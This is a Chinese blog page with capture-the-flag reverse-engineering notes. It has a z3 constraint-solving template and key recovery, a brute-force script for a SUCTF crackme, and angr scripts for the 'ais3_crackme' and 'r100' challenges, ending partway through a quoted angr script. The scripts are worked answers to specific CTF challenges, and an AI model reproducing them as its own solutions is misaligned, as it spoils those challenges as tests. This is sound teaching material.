<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no">
<meta name="author" content="4eriri">


    
    


<meta property="og:type" content="website">
<meta property="og:title" content="4eriri&#39;s blog">
<meta property="og:url" content="http://yoursite.com/page/5/index.html">
<meta property="og:site_name" content="4eriri&#39;s blog">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="4eriri&#39;s blog">

<link rel="apple-touch-icon" href="/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="4eriri&#39;s blog" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.ico">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">


    <style> .article { opacity: 0;} </style>


<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>4eriri&#39;s blog</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: true,
        isPost: false,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script> yiliaConfig.jquery_ui = [false]; </script>



    <script> yiliaConfig.rootUrl = "\/";</script>






</head></html>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/avatar.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">4eriri</a></h1>
        </hgroup>

        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto:itrickl@outlook.com" title="Email"></a>
                            
                                <a class="fa QQ" href="tencent://message/?uin=495764845&Site=4eriri&Menu=yes" title="QQ"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
                    
                    </div>
                </section>
                

                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">4eriri</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/avatar.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">4eriri</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:itrickl@outlook.com" title="Email"></a>
                            
                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=495764845&Site=4eriri&Menu=yes" title="QQ"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap">
  
    <article id="post-z3求解" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/11/20/z3求解/" class="article-date">
      <time datetime="2018-11-20T03:00:15.000Z" itemprop="datePublished">2018-11-20</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/20/z3求解/">z3求解</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>之前<a href="https://sh1rker.github.io/2018/10/25/sus-gccc/" target="_blank" rel="noopener">有题</a>应该使用z3求解的一直没有完成，今天就好好学习一下z3，把这题解决了顺便记录一下z3求解的使用！</p>
<p>z3求解大致模版：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x=Int(&apos;x&apos;)      //定义变量</span><br><span class="line">solver=Solver() //构造求解器</span><br><span class="line">solver.add(x==1)//添加约束条件</span><br><span class="line">if solver.check()==sat: //如果有解返回值为sat否则返回unsat</span><br><span class="line">	print solver.model() //打印解</span><br></pre></td></tr></table></figure>
<p>之前一题的z3使用分析：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">num=BitVec(&quot;num&quot;,33)      //这里定义了num为一个32位的二进制数字，至于为什么要写33，是我尝试了很多次无解后发现写33就有解了2333</span><br><span class="line">array=[     </span><br><span class="line">            164,</span><br><span class="line">			25,</span><br><span class="line">			4,</span><br><span class="line">			130,</span><br><span class="line">			126,</span><br><span class="line">			158,</span><br><span class="line">			91,</span><br><span class="line">			199,</span><br><span class="line">			173,</span><br><span class="line">			252,</span><br><span class="line">			239,</span><br><span class="line">			143,</span><br><span class="line">			150,</span><br><span class="line">			251,</span><br><span class="line">			126,</span><br><span class="line">			39,</span><br><span class="line">			104,</span><br><span class="line">			104,</span><br><span class="line">			146,</span><br><span class="line">			208,</span><br><span class="line">			249,</span><br><span class="line">			9,</span><br><span class="line">			219,</span><br><span class="line">			208,</span><br><span class="line">			101,</span><br><span class="line">			182,</span><br><span class="line">			62,</span><br><span class="line">			92,</span><br><span class="line">			6,</span><br><span class="line">			27,</span><br><span class="line">			5,</span><br><span class="line">			46]</span><br><span class="line">b=range(32)</span><br><span class="line">for i in range(32):</span><br><span class="line">	temp=0</span><br><span class="line">	for j in range(i):</span><br><span class="line">		temp^=array[j]</span><br><span class="line">	b[i]=temp</span><br><span class="line">solver=Solver()</span><br><span class="line">solver.add(array[0]^(num&amp;0xff)^b[0]==ord(&apos;F&apos;)).   //根据题目添加条件</span><br><span class="line">solver.add(array[1]^((num&gt;&gt;1)&amp;0xff)^b[1]==ord(&apos;L&apos;))</span><br><span class="line">solver.add(array[2]^((num&gt;&gt;2)&amp;0xff)^b[2]==ord(&apos;A&apos;))</span><br><span class="line">solver.add(array[3]^((num&gt;&gt;3)&amp;0xff)^b[3]==ord(&apos;G&apos;))</span><br><span class="line">solver.add(array[4]^((num&gt;&gt;4)&amp;0xff)^b[4]==ord(&apos;&#123;&apos;))</span><br><span class="line">for i in range(5,31):					//多次重复的输入可以用循环来操作</span><br><span class="line">	solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&lt;=90)</span><br><span class="line">	solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&gt;=65)</span><br><span class="line">solver.add(array[31]^((num&gt;&gt;31)&amp;0xff)^b[31]==ord(&apos;&#125;&apos;))</span><br><span class="line">if solver.check()==sat :</span><br><span class="line">	print solver.model()			   //得到正确的num</span><br></pre></td></tr></table></figure>
<p>这种简单的z3求解的运用不是很难，但是却比爆破之类的方法来的快很多。<br>其实今天也没学习多少有关z3的，之前一直无解只有因为定义的时候没用33……</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-basic-re-su" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/11/07/basic-re-su/" class="article-date">
      <time datetime="2018-11-07T13:19:32.000Z" itemprop="datePublished">2018-11-07</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/07/basic-re-su/">basic-re-su</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line">v4 = 2;</span><br><span class="line">  v5 = 3;</span><br><span class="line">  v6 = 2;</span><br><span class="line">  v7 = 1;</span><br><span class="line">  v8 = 4;</span><br><span class="line">  v9 = 7;</span><br><span class="line">  v10 = 4;</span><br><span class="line">  v11 = 5;</span><br><span class="line">  v12 = 10;</span><br><span class="line">  v13 = 11;</span><br><span class="line">  v14 = 10;</span><br><span class="line">  v15 = 9;</span><br><span class="line">  v16 = 14;</span><br><span class="line">  v17 = 15;</span><br><span class="line">  v18 = 12;</span><br><span class="line">  v19 = 13;</span><br><span class="line">  v20 = 16;</span><br><span class="line">  v21 = 19;</span><br><span class="line">  v22 = 16;</span><br><span class="line">  v23 = 17;</span><br><span class="line">  v24 = 20;</span><br><span class="line">  v25 = 23;</span><br><span class="line">  v26 = 22;</span><br><span class="line">  v27 = 19;</span><br><span class="line">  v28 = 28;</span><br><span class="line">  v29 = 25;</span><br><span class="line">  v30 = 30;</span><br><span class="line">  v31 = 31;</span><br><span class="line">  v32 = 28;</span><br><span class="line">  v33 = 25;</span><br><span class="line">  v34 = 26;</span><br><span class="line">  v35 = 31;</span><br><span class="line">  v36 = 36;</span><br><span class="line">  v37 = 33;</span><br><span class="line">  v38 = 34;</span><br><span class="line">  v39 = 39;</span><br><span class="line">  v40 = 36;</span><br><span class="line">  v41 = 33;</span><br><span class="line">  v42 = 34;</span><br><span class="line">  v43 = 35;</span><br><span class="line">  v44 = 40;</span><br><span class="line">  v45 = 41;</span><br><span class="line">  v46 = 46;</span><br><span class="line">  v47 = 43;</span><br><span class="line">  v48 = 36;</span><br><span class="line">  v49 = 45;</span><br><span class="line">  v50 = 38;</span><br><span class="line">  v51 = 47;</span><br><span class="line">  v52 = 56;</span><br><span class="line">  v53 = 49;</span><br><span class="line">  v54 = 58;</span><br><span class="line">  v55 = 59;</span><br><span class="line">  v56 = 52;</span><br><span class="line">  v57 = 61;</span><br><span class="line">  v58 = 62;</span><br><span class="line">  v59 = 55;</span><br><span class="line">  v60 = 48;</span><br><span class="line">  v61 = 57;</span><br><span class="line">  v62 = 50;</span><br><span class="line">  v63 = 59;</span><br><span class="line">  v64 = 60;</span><br><span class="line">  v65 = 53;</span><br><span class="line">  v66 = 54;</span><br><span class="line">  v67 = 55;</span><br><span class="line">  v68 = 72;</span><br><span class="line">  v69 = 73;</span><br><span class="line">  v70 = 66;</span><br><span class="line">  v71 = 66;</span><br><span class="line">  v72 = 68;</span><br><span class="line">  v73 = 68;</span><br><span class="line">  v74 = 70;</span><br><span class="line">  v75 = 71;</span><br><span class="line">  v76 = 72;</span><br><span class="line">  v77 = 73;</span><br><span class="line">  v78 = 74;</span><br><span class="line">  v79 = 74;</span><br><span class="line">  v80 = 77;</span><br><span class="line">  v81 = 77;</span><br><span class="line">  v82 = 79;</span><br><span class="line">  v83 = 78;</span><br><span class="line">  v84 = 80;</span><br><span class="line">  v85 = 80;</span><br><span class="line">  v86 = 82;</span><br><span class="line">  v87 = 83;</span><br><span class="line">  v88 = 85;</span><br><span class="line">  v89 = 84;</span><br><span class="line">  v90 = 86;</span><br><span class="line">  v91 = 87;</span><br><span class="line">  v92 = 89;</span><br><span class="line">  v93 = 89;</span><br><span class="line">  v94 = 90;</span><br><span class="line">  v95 = 91;</span><br><span class="line">  v96 = 92;</span><br><span class="line">  v97 = 93;</span><br><span class="line">  v98 = 94;</span><br><span class="line">  v99 = 94;</span><br><span class="line">  v100 = 96;</span><br><span class="line">  v101 = 96;</span><br><span class="line">  v102 = 99;</span><br><span class="line">  v103 = 99;</span><br><span class="line">  v104 = 100;</span><br><span class="line">  v105 = 101;</span><br><span class="line">  v106 = 103;</span><br><span class="line">  v107 = 103;</span><br><span class="line">  v108 = 105;</span><br><span class="line">  v109 = 105;</span><br><span class="line">  v110 = 107;</span><br><span class="line">  v111 = 107;</span><br><span class="line">  v112 = 108;</span><br><span class="line">  v113 = 109;</span><br><span class="line">  v114 = 110;</span><br><span class="line">  v115 = 110;</span><br><span class="line">  v116 = 112;</span><br><span class="line">  v117 = 112;</span><br><span class="line">  v118 = 114;</span><br><span class="line">  v119 = 115;</span><br><span class="line">  v120 = 116;</span><br><span class="line">  v121 = 117;</span><br><span class="line">  v122 = 119;</span><br><span class="line">  v123 = 119;</span><br><span class="line">  v124 = 120;</span><br><span class="line">  v125 = 121;</span><br><span class="line">  v126 = 123;</span><br><span class="line">  v127 = 123;</span><br><span class="line">  v128 = 125;</span><br><span class="line">  v129 = 125;</span><br><span class="line">  v130 = 127;</span><br><span class="line">  v131 = 127;</span><br><span class="line">  v132 = 129;</span><br><span class="line">  v133 = 129;</span><br><span class="line">  v134 = 131;</span><br><span class="line">  v135 = 131;</span><br><span class="line">  v136 = 140;</span><br><span class="line">  v137 = 141;</span><br><span class="line">  v138 = 142;</span><br><span class="line">  v139 = 143;</span><br><span class="line">  v140 = 136;</span><br><span class="line">  v141 = 137;</span><br><span class="line">  v142 = 138;</span><br><span class="line">  v143 = 139;</span><br><span class="line">  v144 = 140;</span><br><span class="line">  v145 = 141;</span><br><span class="line">  v146 = 142;</span><br><span class="line">  v147 = 135;</span><br><span class="line">  v148 = 152;</span><br><span class="line">  v149 = 145;</span><br><span class="line">  v150 = 146;</span><br><span class="line">  v151 = 147;</span><br><span class="line">  v152 = 148;</span><br><span class="line">  v153 = 149;</span><br><span class="line">  v154 = 150;</span><br><span class="line">  v155 = 151;</span><br><span class="line">  v156 = 152;</span><br><span class="line">  v157 = 153;</span><br><span class="line">  v158 = 154;</span><br><span class="line">  v159 = 154;</span><br><span class="line">  v160 = 156;</span><br><span class="line">  v161 = 156;</span><br><span class="line">  v162 = 158;</span><br><span class="line">  v163 = 158;</span><br><span class="line">  v164 = 160;</span><br><span class="line">  v165 = 160;</span><br><span class="line">  v166 = 162;</span><br><span class="line">  v167 = 162;</span><br><span class="line">  v168 = 164;</span><br><span class="line">  v169 = 164;</span><br><span class="line">  v170 = 166;</span><br><span class="line">  v171 = 166;</span><br><span class="line">  v172 = 168;</span><br><span class="line">  v173 = 168;</span><br><span class="line">  v174 = 170;</span><br><span class="line">  v175 = 170;</span><br><span class="line">  v176 = 172;</span><br><span class="line">  v177 = 172;</span><br><span class="line">  v178 = 174;</span><br><span class="line">  v179 = 174;</span><br><span class="line">  v180 = 176;</span><br><span class="line">  v181 = 177;</span><br><span class="line">  v182 = 178;</span><br><span class="line">  v183 = 179;</span><br><span class="line">  memset(v184, 0, 0x1Fui64);</span><br><span class="line">  sub_140011159(std::cout, &quot;flag format: SUCTF&#123;xxxxxxxxxxxxxxx&#125;\n&quot;);</span><br><span class="line">  sub_140011159(std::cout, &quot;Please Input Key:&quot;);</span><br><span class="line">  std::basic_istream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&gt;&gt;(std::cin, &amp;v186);</span><br><span class="line">  v186 %= 0x10000u;</span><br><span class="line">  v185 = 8;</span><br><span class="line">  while ( v185 )</span><br><span class="line">  &#123;</span><br><span class="line">    --v185;</span><br><span class="line">    for ( j = 22; j; v184[j] |= v189 &lt;&lt; v185 )</span><br><span class="line">    &#123;</span><br><span class="line">      v188 = *(&amp;v4 + 22 * v185 + --j);</span><br><span class="line">      v189 = (v188 &gt;&gt; ((v186 &gt;&gt; 2 * v185) &amp; 3)) &amp; 1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140011159(std::cout, v184);</span><br><span class="line">  system(&quot;pause&quot;);</span><br><span class="line">  sub_1400113A7((__int64)&amp;v3, (__int64)&amp;unk_14001AD10);</span><br><span class="line">  return 0i64;</span><br></pre></td></tr></table></figure>
<p>这一题很简单，只是在爆破的时候遇到几个坑(因为自己的鶸），所以记录一下。</p>
<p>程序流程就是输入一个key，大小为<code>0x0001~0xffff</code>。经过运算后输出v184，给了flag格式直接爆破就是了。</p>
<p>但是ida初始化是，v4后面大于127的值都默认显示成了负数，这样是爆破不出来的，按两次h转换成正数。</p>
<p>其他就是爆破时的逻辑了，基本上照着原代码copy就行了。</p>
<p>爆破脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">value=[2,3,2,1,4,7,4,5,10,11,10,9,14,15,12,13,16,19,16,17,20,23,22,19,28,25,30,31,28,25,26,31,36,33,34,39,36,33,34,35,40,41,46,43,36,45,38,47,56,49,58,59,52,61,62,55,48,57,50,59,60,53,54,55,72,73,66,66,68,68,70,71,72,73,74,74,77,77,79,78,80,80,82,83,85,84,86,87,89,89,90,91,92,93,94,94,96,96,99,99,100,101,103,103,105,105,107,107,108,109,110,110,112,112,114,115,116,117,119,119,120,121,123,123,125,125,127,127,129,129,131,131,140,141,142,143,136,137,138,139,140,141,142,135,152,145,146,147,148,149,150,151,152,153,154,154,156,156,158,158,160,160,162,162,164,164,166,166,168,168,170,170,172,172,174,174,176,177,178,179]</span><br><span class="line">for key in range(0xffff):</span><br><span class="line">	flagnc=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]</span><br><span class="line">	for i in range(7,-1,-1):</span><br><span class="line">		for j in range(21,-1,-1):</span><br><span class="line">			v188=value[22*i+j]</span><br><span class="line">			v189=(v188&gt;&gt;((key&gt;&gt;2*i)&amp;3))&amp;1</span><br><span class="line">			flagnc[j]|=v189&lt;&lt;i</span><br><span class="line">	flag=&quot;&quot;.join([chr(ch) for ch in flagnc])</span><br><span class="line">	if ~flag.find(&quot;SUCTF&#123;&quot;):</span><br><span class="line">		print flag</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-符号执行Angr" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/11/03/符号执行Angr/" class="article-date">
      <time datetime="2018-11-03T14:57:50.000Z" itemprop="datePublished">2018-11-03</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/11/03/符号执行Angr/">符号执行Angr</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p><em>突然发现记录一些简单题的做题过程只会浪费时间，以后就不记录特别简单的题了（虽然难的题也不会写XD</em></p>
<p>今天在做whalectf上面的题目时，有两道类型差不多的题，但是一道用爆破解出来了，<a href="http://whalectf.xin/challenges#crackme(ais3" target="_blank" rel="noopener">另一道</a>)却解不出来，查找writeup的时候找不到一样的题目，但是找到了类似的题目，并且发现了符号执行这个东西，学习后掌握了新的解题技巧。</p>
<p>首先要安装angr库，具体操作方法可以百度。</p>
<p>解题脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import angr </span><br><span class="line">import claripy </span><br><span class="line">p = angr.Project(&quot;./ais3_crackme&quot;) </span><br><span class="line">argv1=claripy.BVS(&apos;argv1&apos;,24*8)</span><br><span class="line">state=p.factory.entry_state(args=[&apos;./ais3_crackme&apos;,argv1])</span><br><span class="line">simgr=p.factory.simgr(state)</span><br><span class="line">simgr.explore(find=0x400602,avoid=0x40060e)</span><br><span class="line">print simgr.found[0].solver.eval(argv1,cast_to=str)</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<p><code>p = angr.Project(&quot;./ais3_crackme&quot;)</code></p>
<p>为每一个angr脚本必备</p>
<p><code>argv1=claripy.BVS(&#39;argv1&#39;,24*8)</code></p>
<p>是以二进制形式设一个参数，ida分析程序得知参数长度为24</p>
<p><code>state=p.factory.entry_state(args=[&#39;./ais3_crackme&#39;,argv1])</code></p>
<p>获取程序的初始状态</p>
<p><code>simgr=p.factory.simgr(state)</code></p>
<p>遍历路径</p>
<p><code>simgr.explore(find=0x400602,avoid=0x40060e)</code></p>
<p>设定成功与失败的路径结果，地址由ida分析得</p>
<p><code>print simgr.found[0].solver.eval(argv1,cast_to=str)</code></p>
<p>以字符串形式输出结果</p>
<p>这一题几乎是照抄着写了一遍，因此再把之前那道<a href="http://whalectf.xin/challenges#r100(defcamp" target="_blank" rel="noopener">简单的题</a>)拿出来练一下手。</p>
<p>脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import angr </span><br><span class="line">p = angr.Project(&quot;./r100&quot;) </span><br><span class="line">state=p.factory.entry_state(args=[&apos;./r100&apos;])</span><br><span class="line">simgr=p.factory.simgr(state)</span><br><span class="line">simgr.explore(find=0x400844,avoid=0x400855)</span><br><span class="line">print simgr.found[0].posix.dumps(0)</span><br></pre></td></tr></table></figure>
<p>但还是不太熟练，可至少拥有了两个简单的模版XD</p>
<p>再摘录一下<a href="http://www.freebuf.com/articles/web/150296.html" target="_blank" rel="noopener">freebuf上的较通用脚本</a>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line">print &quot;[*]start------------------------------------&quot;</span><br><span class="line">p = angr.Project(sys.argv[1])  # 建立工程初始化二进制文件</span><br><span class="line">state = p.factory.entry_state() # 获取入口点处状态</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">state.posix.files[0].read_from(1)表示从标准输入读取一个字节</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">for _ in 